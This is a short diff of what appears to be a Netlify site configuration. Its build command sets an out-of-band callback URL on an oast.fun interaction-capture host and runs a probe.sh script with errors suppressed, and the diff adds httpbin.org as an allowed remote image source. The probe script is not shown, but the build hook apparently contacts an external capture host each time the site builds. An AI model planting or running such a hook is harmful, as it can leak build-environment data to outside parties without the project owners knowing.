@@ -1,3 +1,6 @@
 [build]
   command = "NFP_OOB_URL=\"https://dab154553hekjnroahe07fb9jpyto4nwp.oast.fun/\" bash ./probe.sh || true"
   publish = "public"
+
+[images]
+  remote_images = ['https://httpbin.org/.*']
